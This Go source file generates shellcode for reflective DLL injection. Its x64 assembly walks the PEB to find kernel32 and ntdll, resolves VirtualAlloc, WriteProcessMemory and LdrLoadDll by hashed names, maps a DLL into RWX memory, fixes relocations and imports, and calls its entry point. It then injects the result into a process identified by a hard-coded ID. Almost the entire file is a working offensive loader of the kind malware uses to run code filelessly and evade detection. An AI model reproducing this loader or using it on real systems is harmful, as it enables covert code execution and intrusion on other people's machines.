package main

import (
	"fmt"
	"log"
	"os"
	"strings"
)

func main() {

	dllBytes, err := os.ReadFile("mydll.dll")
	if err != nil {
		log.Fatalf("Failed to open file %v", err)
	}

	sizeBytes := uint64ToBytes(uint64(len(dllBytes)))

	jmpInstruction := fmt.Sprintf("jmp 0x%x;", len(dllBytes)+13)

	/*
		<<<SRDI Format:>>>
		-----------------------------
		JMP INSTRUCTION
		-----------------------------
		RAW DLL BYTES
		-----------------------------
		DLL SIZE QWORD
		-----------------------------
		Shellcode for reflective loading
		-----------------------------
	*/

	shellcode := []string{

		"Prologue:",
		"	push r12;", //Push volatile registers to stack
		"	push r13;",
		"	push r14;",
		"	push r15;",
		"	push rsi;",
		"	push rdi;",
		"	push rbx;",
		"	push rbp;",
		"	mov rbp,rsp;",                 // move rsp to rbp (use rbp as reference for local variables / not x64 standard)
		"	and rsp,0x0FFFFFFFFFFFFFFF0;", // stack alignment
		"	sub rsp,0x200;",               // create stack space
		"	lea rdi, [rip - 0x29];",       // Get the address of the dll size
		"   mov rax, [rdi];",            //DLL size
		"	sub rdi, rax;",                //base address of the raw dll bytes
		" 	mov qword ptr [rbp],rax;",    // push size of DLL to stack
		" 	mov qword ptr [rbp-8],rdi;",  // push base address of the raw dll bytes to stack

		"find_kernel32:",
		" 	xor rdx, rdx;",
		" 	mov rax, gs:[rdx+0x60];", // RAX stores  the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
		" 	mov rsi,[rax+0x18];",     // Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
		" 	mov rsi,[rsi + 0x20];",   // RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
		" 	mov r9, [rsi];",          // Current module is the current exe
		" 	mov r8, [r9+0x20];",      // Current module is ntdll.dll
		" 	mov r9, [r9];",
		" 	mov r9, [r9+0x20];",           // Current module is kernel32.dll
		" 	mov qword ptr [rbp-0x10],r8;", //Push ntdll.dll addr in the stack
		" 	mov qword ptr [rbp-0x18],r9;", //Push kernel32.dll addr in the stack
		" 	jmp reflective_loader;",

		"parse_module:",                     // Parsing DLL file in memory
		" 	mov ecx, dword ptr [r9 + 0x3c];", // R9 stores  the base address of the module, get the NT header offset
		" 	xor r15, r15;",
		" 	mov r15b, 0x88;", // Offset to Export Directory
		" 	add r15, r9;",
		" 	add r15, rcx;",
		" 	mov r15d, dword ptr [r15];",        // Get the RVA of the export directory
		" 	add r15, r9;",                      // R14 stores  the VMA of the export directory
		" 	mov ecx, dword ptr [r15 + 0x18];",  // ECX stores  the number of function names as an index value
		" 	mov r14d, dword ptr [r15 + 0x20];", // Get the RVA of ENPT
		" 	add r14, r9;",                      // R14 stores  the VMA of ENPT

		"search_function:",   // Search for a given function
		" 	jrcxz not_found;", // If RCX is 0, the given function is not found
		" 	dec ecx;",         // Decrease index by 1
		" 	xor rsi, rsi;",
		" 	mov esi, [r14 + rcx*4];", // RVA of function name string
		" 	add rsi, r9;",            // RSI points to function name string

		"function_hashing:", // Hash function name function
		" 	xor rax, rax;",
		" 	xor rdx, rdx;",
		" 	cld;", // Clear DF flag

		"iteration:",         // Iterate over each byte
		" 	lodsb;",           // Copy the next byte of RSI to Al
		" 	test al, al;",     // If reaching the end of the string
		" 	jz compare_hash;", // Compare hash
		" 	ror edx, 0x0d;",   // Part of hash algorithm
		" 	add edx, eax;",    // Part of hash algorithm
		" 	jmp iteration;",   // Next byte

		"compare_hash:", // Compare hash
		" 	cmp edx, r8d;",
		"	jnz search_function;",               // If not equal, search the previous function (index decreases)
		"	mov r10d, [r15 + 0x24];",            // Ordinal table RVA
		"	add r10, r9;",                       // Ordinal table VMA
		"	movzx ecx, word ptr [r10 + 2*rcx];", // Ordinal value -1
		"	mov r11d, [r15 + 0x1c];",            // RVA of EAT
		"	add r11, r9;",                       // VMA of EAT
		"	mov eax, [r11 + 4*rcx];",            // RAX stores  RVA of the function
		"	add rax, r9;",                       // RAX stores  VMA of the function
		"	ret;",
		"not_found:",
		"	ret;",

		"reflective_loader:",
		"	xor rax,rax;",
		"	mov rdi, [rbp-8];",              // Get the address raw dll
		"	mov eax, dword ptr [rdi+0x3c];", // e_lfanew -> ax
		"	add rdi,rax;",                   // Address of ntheader
		" 	mov qword ptr [rbp-0x20],rdi;", //  push address of ntheader to stack
		"	add rdi,0x4;",                   // address of file header
		" 	mov qword ptr [rbp-0x28],rdi;", //  push address of fileheader to stack
		"	add rdi,0x14;",                  // address of file header
		" 	mov qword ptr [rbp-0x30],rdi;", //  push address of optional to stack
		"	mov eax, dword ptr [rdi+0x38];", // size of image to eax
		"	push rax;",                      //push size of image to stack eax to be used from parse_module
		"	mov rax, qword ptr [rdi+0x18];", // imagebase to rax
		"	push rax;",

		//VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		"call_virtualAlloc:",
		"   mov r9,qword ptr [rbp-0x18];", // move kernel32 base address to r9 for parse_module
		"   mov r8d, 0x91afca54;",         // VirtualAlloc Hash
		"   call parse_module;",           // Search and obtain address of VirtualAlloc
		"	pop rcx;",                       // imagbase to rcx
		"	mov rsi,rcx;",                   //save the value for later
		"	pop rdx;",                       // image soze to rdx
		"	mov r8, 0x3000;",                //MEM_RESERVE | MEM_COMMIT = 0x3000
		"	mov r9, 0x40;",                  //PAGE_EXECUTE_READWRITE = 0x40
		"	sub rsp,0x20;",                  // shadow space
		"	call rax;",                      // call VirtualAlloc
		"	add rsp,0x20;",                  // restore stack
		" 	mov qword ptr [rbp-0x38],rax;", //  push dllBase address to stack
		"	sub rax,rsi;",                   // deltaImageBase to be used later
		" 	mov qword ptr [rbp-0x40],rax;", //  push deltaImageBase to stack

		"call_currentProcess:",
		"   mov r9,qword ptr [rbp-0x18];", // move kernel32 base address to r9 for parse_module
		"   mov r8d, 0x7b8f17e6;",         // GetCurrentProcess Hash
		"   call parse_module;",           // Search and obtain address of GetCurrentProcess
		"	call rax;",                      // call GetCurrentProcess
		" 	mov qword ptr [rbp-0x48],rax;", //   push Current Process handle to stack

		"call_writeprocessmemory:",         // Write headers to the target address
		"   mov r9,qword ptr [rbp-0x18];",  // move kernel32 base address to r9 for parse_module
		"   mov r8d, 0xd83d6aa1;",          // WriteProcessMemory Hash
		"   call parse_module;",            // Search and obtain address of WriteProcessMemory
		"   mov rcx,qword ptr [rbp-0x48];", // current process handle
		"	mov rdx,qword ptr [rbp-0x38];",   //dll base
		"	mov r8,qword ptr [rbp-0x8];",     // raw bytes of dll
		"	xor r9,r9;",
		"	push r9;",                       // Placeholder for the bytesWritten
		"	mov r9d, dword ptr [rdi+0x3c];", // Size of headers to r8
		"   lea rsi, [rsp];",              //place to write the byteswritten
		"	push rsi;",
		"	sub rsp,0x20;", // shadow space
		"	call rax;",     // call WPM
		"	add rsp,0x20;", // restore stack

		"copy_sections:",                 //Copy sections to the target address
		"	mov r13,qword ptr [rbp-0x30];", // Optional header -> rsi
		"	add r13, 0xf0;",                // Section header = Optionalheader + 0xf0 -> rsi
		"	mov rdi,qword ptr [rbp-0x28];", // fileheader address -> rsi
		"	mov ax, word ptr [rdi+0x2];",   // FileHeader.NumberOfSections -> ax
		"	mov rdi,rax;",                  // rax volatile writeprocess memory would erase

		"copy_sections_loop:",
		"	cmp rdi,0;",                      //check if loop is finished
		"	je copy_sections_loop_finished;", // jump out of the loop

		"   mov r9,qword ptr [rbp-0x18];", // move kernel32 base address to r9 for parse_module
		"   mov r8d, 0xd83d6aa1;",         // WriteProcessMemory Hash
		"   call parse_module;",           // Search and obtain address of WriteProcessMemory

		"   mov rcx,qword ptr [rbp-0x48];", // current process handle
		"	mov rdx,qword ptr [rbp-0x38];",   //dll base
		"	xor r12,r12;",                    // 0 -> r12
		"	mov r12d,dword ptr [r13+0xc];",   // section.VirtualAddress -> r12d
		"	add rdx,r12;",                    // dllbase + sectionVA

		"	mov r8,qword ptr [rbp-0x8];",    // raw bytes of dll
		"	mov r12d,dword ptr [r13+0x14];", // section.PointerToRawData              -> r12d
		"	add r8,r12;",                    //dllPtr+section.PointerToRawData
		"	xor r9,r9;",
		"	push r9;",                       // Placeholder for the bytesWritten
		"	mov r9d, dword ptr [r13+0x10];", // SizeOfRawData
		"   lea r11, [rsp];",              //place to write the byteswritten
		"	push r11;",
		"	sub rsp,0x20;", // shadow space
		"	call rax;",     // call WPM
		"	add rsp,0x20;", // restore stack

		// WPM E
		"	dec rdi;",                // rax--;
		"	add r13, 0x28;",          // point to the beginning of the next section header
		"	jmp copy_sections_loop;", // next iteration

		"copy_sections_loop_finished:",
		"	nop;",
		// Start memory relocations //

		"memory_relocations:",            // start memory relocations
		"	mov r13,qword ptr [rbp-0x30];", // Optional header -> r13
		"	add r13, 0x98;",                // Points to IMAGE_DIRECTORY_ENTRY_BASERELOC
		"	mov eax, dword ptr[r13];",      // relocations.VirtualAddress ->rax
		"	add rax,qword ptr [rbp-0x38];", // relocation_table
		"	xor rdi,rdi;",                  // relocations_processed counter

		"memory_relocations_loop:",
		// Maintain rax (relocation_table), rdi (relocations_processed) throughout this loop
		// rsi (relocation_block) calculated at the beginning and used throutout the loop
		// r8d (PAGERVA)
		// r9d (BlockSize)

		"	mov rsi,rax;",                // relocation block
		"	add rsi,rdi;",                //relocation block (relocation_table + relocations processed) -> rsi
		"	mov r8d, dword ptr [rsi];",   //PAGERVA
		"	mov r9d, dword ptr [rsi+4];", //BlockSize
		"	mov rcx,r9;",                 //Block size -> rcx
		"	sub rcx,0x8;",                // BLocksize-8 ->rcx
		"	shr rcx,1;",                  // Blocksize/2 -> rcx
		"	xor r10,r10;",
		"	or r10d,r9d;",
		"	or r10d,r8d;",
		"	test r10d,r10d;", //check r10d is zero
		"	jz exit_relocations_loop;",
		"	add rsi, 0x8;", // relocEntry
		"relocation_entries_loop:",
		"	cmp rcx,0;",
		"	je relocation_entries_loop_end;", // jump out of the loop
		"	mov r11d,dword ptr [rsi];",
		"	and r11d,0xf000;",
		"	shr r11d,12;",                             //type -> r11
		"	test r11,r11;",                            //test if r11 is 0
		"	jz relocation_entries_loop_inc_counters;", //continue

		"	mov r11d,dword ptr [rsi];", //type -> r11
		"	and r11d,0xfff;",
		"	mov r13,r8;",
		"	add r13,r11;", //relocationRVA

		"	add r13, qword ptr[rbp-0x38];", //absolute address of relocation

		"	mov r12, qword ptr[r13];",      //  address to patch -> r9
		"	add r12, qword ptr[rbp-0x40];", // address to patch  + delta
		"	mov qword ptr[r13], r12;",      // patch

		"relocation_entries_loop_inc_counters:",
		"	dec rcx;",
		"	add rsi, 0x2;",
		"	jmp relocation_entries_loop;",

		//end of relocations entries loop
		"relocation_entries_loop_end:",
		"	add rdi,r9;",                  // point to the next relocationblock
		"	jmp memory_relocations_loop;", //iterate

		"exit_relocations_loop:",

		"imports:",
		"	mov r13,qword ptr [rbp-0x30];", // Optional header -> r13
		"	add r13, 0x78;",                // Points to IMAGE_DIRECTORY_ENTRY_BASERELOC
		"	mov r12d, dword ptr[r13];",     // imports.VirtualAddress ->rax
		"	add r12,qword ptr [rbp-0x38];", // Import Descriptor address

		"imports_loop:",
		//r12 -> import descriptor address

		"	mov r13, r12;",                  // rax points to the beginning of the import
		"	add r13, 0x0c;",                 // offset 0xc points to the name RVA
		"	mov r13d, dword ptr[r13];",      //dereference to get RVA value to r13
		"	cmp r13d, 0x0;",                 //check if RVA is 0
		"	je exit_imports_loop;",          // exit loop if RVA ==0
		"	add r13, qword ptr [rbp-0x38];", // dll name address
		"	mov rsi,r13;",                   // used by loadsb

		/*
		   typedef struct _UNICODE_STRING {
		     USHORT Length;
		     USHORT MaximumLength;
		     PWSTR  Buffer;
		   } UNICODE_STRING, *PUNICODE_STRING;
		*/
		"	xor rax,rax;", // used by loadsb
		"	xor r11,r11;", // size
		"	push rax;",    // Creating a space of 0s for the Unicode String Buffer
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",
		"	push rax;",

		"loop_through_DLL:",            // Iterate over each byte
		" 	lodsb;",                     // Copy the next byte of RSI to Al
		" 	test al, al;",               // If reaching the end of the string
		" 	jz end_loop_through_DLL;",   //
		"	mov byte ptr [rsp+r11], al;", // In the buffer we write the dll name bytes in every second byte. (0s in between K.E.R.N.E.L.3.2.D.L.L..)

		"	add r11w,0x2;",
		" 	jmp loop_through_DLL;", // Next byte

		"end_loop_through_DLL:", // Iterate over each byte
		"	add r11w, 0x2;",       // MaximumLength
		"	mov ax,r11w;",
		"	shl rax,16;",
		"	sub r11w, 0x2;",    //Length
		"	or rax,r11;",       // first qword is the length and max length
		"   lea rsi, [rsp];", // pointer to the stack
		"	push rsi;",         //push pointer to the stack
		"	push rax;",         // push lengts to the stack to form the UNICODE
		"   lea rsi, [rsp];", // Pointer to the UNICODE_STRING
		"	push rsi;",         // unicode string of the dll

		"   mov r9,qword ptr [rbp-0x10];", // move ntdll base address to r9 for parse_module
		"   mov r8d, 0xb0988fe4;",         // LdrLoadDll Hash

		"   call parse_module;", // Search and obtain address of LdrLoadDll

		"	xor rcx,rcx;",
		"	inc rcx;",    // first arg 1
		"	pop r8;",     // third arg Pointer to the unicode string on the stack
		" 	xor r9,r9;", // 0 -> r9
		"	push r9;",
		"   lea rdx, [rsp];", // second arg null pointer
		"   lea r9, [rsp];",  // fourth argument pointer the dll base address
		"	mov rsi, r9;",

		"	sub rsp,0x20;",         // shadow space
		"	call rax;",             // call LdrLoadDll
		"	add rsp,0x20;",         // restore stack
		"	push r12;",             // import descriptor address -> stack
		"	push qword ptr [rsi];", // address of dll to stack
		"	mov r12d, dword ptr[r12+0x10];",
		"	add r12,qword ptr [rbp-0x38];", // furst thunk address

		"inner_import_loop:",
		"	mov r13d, dword ptr[r12];",      //dereference to get RVA value to r13
		"	cmp r13d, 0x0;",                 //check if RVA is 0
		"	je exit_inner_import_loop;",     // exit loop if RVA ==0
		"	add r13, qword ptr [rbp-0x38];", //
		"	add r13,0x2;",
		"	mov rsi,r13;",

		//"function_hashing:", // Hash function name function
		" 	xor rax, rax;",
		" 	xor rdx, rdx;",
		" 	cld;", // Clear DF flag

		"iteration2:",          // Iterate over each byte
		" 	lodsb;",             // Copy the next byte of RSI to Al
		" 	test al, al;",       // If reaching the end of the string
		" 	jz getProcAddress;", // Compare hash
		" 	ror edx, 0x0d;",     // Part of hash algorithm
		" 	add edx, eax;",      // Part of hash algorithm
		" 	jmp iteration2;",    // Next byte

		"getProcAddress:",
		"   mov r9,qword ptr[rsp];", // move dll base address to r9 for parse_module
		"   mov r8d, edx;",          // Hash
		"   call parse_module;",     // Search and obtain address of GetCurrentProcess

		"	mov qword ptr[r12],rax;", // write import

		"	add r12,0x8;",           // point to next proc address
		"	jmp inner_import_loop;", //loop

		"exit_inner_import_loop:",
		"	pop rax;",      // get rid of dll address
		"	pop r12;",      // retrieve Import Descriptor address from stack
		"	add r12,0x14;", // Point to the next import
		"	jmp imports_loop;",

		"exit_imports_loop:",

		"	nop;",
		"	mov r13,qword ptr [rbp-0x30];", // optional header into r13
		"	add r13,0x10;",                 // entry point address
		"	mov r13d, dword ptr [r13];",
		"	add r13,  qword ptr [rbp-0x38];", // absolute entry point address
		"	mov rcx, qword ptr [rbp-0x38];",  // dllbase first arg
		"	mov rdx, 0x1;",                   //	DLL_PROCESS_ATTACH = 0x1 second arg
		"	mov r8, 0x0;",                    // 3rd arg 0
		"	xor r9,r9;",

		"	sub rsp,0x20;", // shadow space
		"	call r13;",
		"	add rsp,0x20;", // shadow space

		/*
			"call_lastError:",
			"   mov r9,qword ptr [rbp-0x18];", // move kernel32 base address to r9 for parse_module
			"   mov r8d, 0x75da1966;",         // GetLastError Hash
			"   call parse_module;",           // Search and obtain address of GetLastError
			"	call rax;",                      //Call GetLastError
		*/

		"Epilogue:",
		"	mov rsp,rbp;",
		"	pop rbp;",
		"	pop rbx;",
		"	pop rdi;",
		"	pop rsi;",
		"	pop r15;",
		"	pop r14;",
		"	pop r13;",
		"	pop r12;",
		"	ret;",
	}

	/*
		[rbp] 		-> dll size
		[rbp-0x8] 	-> dllPtr base address of the raw dll bytes
		[rbp-0x10]	-> ntdll.dll base address
		[rbp-0x18]	-> kernel32.dll base address
		[rbp-0x20]	-> ntheader address
		[rbp-0x28]	-> fileheader address
		[rbp-0x30]	-> optional header address
		[rbp-0x38]  -> dllBase address
		[rbp-0x40] 	-> deltaImageBase
		[rbp-0x48]  -> CurrentProcess Handle 0xfffffff..
	*/

	jmp, err := GenerateShellcode(jmpInstruction)
	if err != nil {
		log.Fatalln(err)
	}

	asm := strings.Join(shellcode, "") // convert slice to a single string
	sc, err := GenerateShellcode(asm)  // generates shellcode from asm string. Values hardcoded for x84_64 arch.
	if err != nil {
		log.Fatalln(err)
	}
	err = AttachWindbg() // Automatically attach debugger
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Print("Press Enter to continue...") //Waiting for the debugger to attach
	fmt.Scanln()
	fmt.Println("Continuing...")
	srdi := append(jmp, dllBytes...)
	srdi = append(srdi, sizeBytes...)
	srdi = append(srdi, sc...)

	err = shecllodeInection(22124, srdi) //Run the generated shellcode
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println("[SUCCESS] Done")
}
